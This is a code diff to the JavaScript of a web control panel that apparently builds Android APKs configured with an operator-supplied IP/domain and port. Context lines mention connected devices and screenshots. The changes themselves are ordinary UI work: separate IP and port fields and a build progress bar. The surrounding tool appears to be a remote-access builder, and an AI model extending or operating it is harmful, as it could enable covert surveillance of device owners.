@@ -4,6 +4,7 @@ const form = document.getElementById("left")
 const msgs = document.getElementById("msgs")
 const output = document.getElementById("output")
 const ipInput = document.getElementById('ipInput')
+const portInput = document.getElementById('portInput')
 
 let currentDevice = ""
 let previousDevice = ""
@@ -164,32 +165,34 @@ function takeScreenshot() {
 
 
 function download() {
-    var data = ipInput.value.trim()
+    var ip = ipInput.value.trim()
+    var port = portInput.value.trim()
+
     try {
-        if (data.length) {
-            var [m_ip, m_port] = data.split(':')
-            console.log()
+        if (ip.length && port.length) {
+            showBuildProgress()
+
             $.ajax({
-                url: `/setup/${m_ip}/${m_port}`,
+                url: `/setup/${ip}/${port}`,
                 success: (data) => {
+                    hideBuildProgress()
                     if (data.success) {
-                        var a = document.createElement('a')
-                        a.href = window.location.protocol + '//' + window.location.hostname + ':8080/download-apk'
-                        a.download = 'app-debug.apk'
-                        a.click()
+                        showMsg('Build success')
                     } else {
                         showMsg(data.error || 'Build failed')
                     }
                 },
                 error: function () {
+                    hideBuildProgress()
                     showMsg('Build request failed')
                 }
             })
         } else {
-            showMsg('Invalid Ip and Port. [ IP:PORT ]')
+            showMsg('Please enter both IP/Domain and Port')
         }
     } catch (error) {
-        showMsg('Invalid Ip and Port. [ IP:PORT ]')
+        hideBuildProgress()
+        showMsg('Build request failed')
     }
 }
 
@@ -200,6 +203,48 @@ function downloadLatest() {
   document.body.appendChild(a);
   a.click();
   document.body.removeChild(a);
+}
+
+function showBuildProgress() {
+    const buildButton = document.querySelector('.section-apk-inline');
+    const buildButtonText = document.getElementById('buildButtonText');
+    const buildProgress = document.getElementById('buildProgress');
+
+    // Disable the build button
+    buildButton.style.pointerEvents = 'none';
+    buildButton.style.opacity = '0.6';
+
+    // Change button text
+    buildButtonText.textContent = 'Building...';
+
+    // Show progress indicator
+    buildProgress.style.display = 'block';
+
+    // Add loading animation to progress bar
+    const progressFill = buildProgress.querySelector('.progress-fill');
+    progressFill.style.width = '0%';
+    progressFill.style.transition = 'width 0.3s ease-in-out';
+
+    // Animate progress bar
+    setTimeout(() => {
+        progressFill.style.width = '100%';
+    }, 100);
+}
+
+function hideBuildProgress() {
+    const buildButton = document.querySelector('.section-apk-inline');
+    const buildButtonText = document.getElementById('buildButtonText');
+    const buildProgress = document.getElementById('buildProgress');
+
+    // Re-enable the build button
+    buildButton.style.pointerEvents = 'auto';
+    buildButton.style.opacity = '1';
+
+    // Restore button text
+    buildButtonText.textContent = 'Build APK';
+
+    // Hide progress indicator
+    buildProgress.style.display = 'none';
 }
 
 function showMsg(msg) {
